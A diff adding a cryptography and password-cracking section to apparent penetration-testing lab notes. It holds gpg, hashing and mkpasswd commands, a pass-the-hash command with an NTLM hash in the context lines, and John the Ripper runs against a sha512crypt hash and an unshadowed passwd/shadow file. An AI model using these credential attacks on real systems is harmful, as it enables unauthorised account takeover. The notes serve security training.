@@ -43,3 +43,39 @@ During our assessment, we discovered a local administrative account that is enab
 ```
 pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
 ```
+### Cryptography
+> $1$: MD5-based crypt ('md5crypt')  
+> $2$: Blowfish-based crypt ('bcrypt')[^bcrypt]  
+> $sha1$: SHA-1-based crypt ('sha1crypt')  
+> $5$: SHA-256-based crypt ('sha256crypt')  
+> $6$: SHA-512-based crypt ('sha512crypt')  
+
+md5sum plain-text, sha1sum plain-text, sha256sum plain-text, sha512sum plain-text  
+> https://crackstation.net/ (unsalted hash crack)  
+###### Generate salted hash
+mkpasswd -m sha512crypt foobar -S "M3vwJPAueK2a1vNM"
+
+###### Symmetric
+gpg -c --cipher-algo blowfish blowfish.plain  
+gpg --decrypt blowfish.plain.gpg  
+gpg -c --cipher-algo aes256 aes256.plain  
+gpg --decrypt aes256.plain.gpg
+
+###### Asymmetric 
+> https://www.cs.drexel.edu/~jpopyack/Courses/CSP/Fa17/notes/10.1_Cryptography/RSA_Express_EncryptDecrypt_v2.html  
+
+gpg --gen-key(enter realname--Offsec and email--test@example.com for identification)  
+gpg --output example-pub.asc --armor --export Offsec  
+gpg --recipient Offsec --encrypt plain.txt  
+gpg --decrypt plain.txt.gpg  
+gpg --import melanie-private.asc  
+gpg --decrypt decrypt-me.gpg(need to enter passphrase)  
+
+###### John the ripper
+john --wordlist=rockyou.txt hash  
+john -form=dynamic='sha1(md5(sha512($p.$s).$p).$s)' --wordlist=rockyou.txt hash  
+john --wordlist=rockyou.txt user_shadow_hash($6$VvN1wBiLLmqWtRXY$oPzxsQbXqdzIISj5NzmKeiUcfXGvFJzqi9YFCzOtdOOI4yOqXm.UBiP7oLeDH8kZUgCtwBwY.YcbqVx7RWlj51)  
+
+###### John crack shadow file
+unshadow passwd.txt shadow.txt > unshadowed.txt  
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt  
